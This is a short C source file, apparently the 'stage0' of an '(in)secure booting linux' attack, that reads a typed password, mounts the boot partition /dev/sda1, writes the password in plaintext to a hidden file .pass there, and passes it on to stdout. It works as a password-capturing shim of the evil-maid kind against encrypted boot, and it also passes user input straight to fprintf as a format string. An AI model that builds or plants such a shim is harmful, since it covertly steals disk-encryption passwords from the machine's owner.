/* (in)secure booting linux
 * Angel Suarez-B Martin (n0w)
 * stage0
 */
#include <stdio.h>
#include <stdlib.h>

// reads line from stdout, return pointer to allocated memory containing it
// from http://stackoverflow.com/questions/314401/how-to-read-a-line-from-the-console-in-c
char * getpass(void) 
{
  char * line = malloc(100), * linep = line;
  size_t lenmax = 100, len = lenmax;
  int c;

  if(line == NULL)
    return NULL;

  for(;;) 
  {
    c = fgetc(stdin);
    
    if(c == EOF)
      break;

    if(--len == 0) 
    {
      len = lenmax;
      char * linen = realloc(linep, lenmax *= 2);

      if(linen == NULL) 
      {
	free(linep);
	return NULL;
      }
      
      line = linen + (line - linep);
      linep = linen;
    }

    if((*line++ = c) == '\n')
      break;
  }
  
  *line = '\0';
  return linep;
}

int main()
{
	
  // read line
  char* key = getpass();

  // mount first disk, first partition in temporal mount
  system("/bin/mkdir /tmpboot");
  system("/bin/mount -t ext2 /dev/sda1 /tmpboot");

  FILE *f = fopen("/tmpboot/.pass", "w");

  // write password to file
  fprintf(f, key);
  fclose(f);
  
  // umount temporal mp
  system("/bin/umount /tmpboot");
  system("/bin/rmdir /tmpboot");

  // print password to stdout
  printf("%s", key);

}
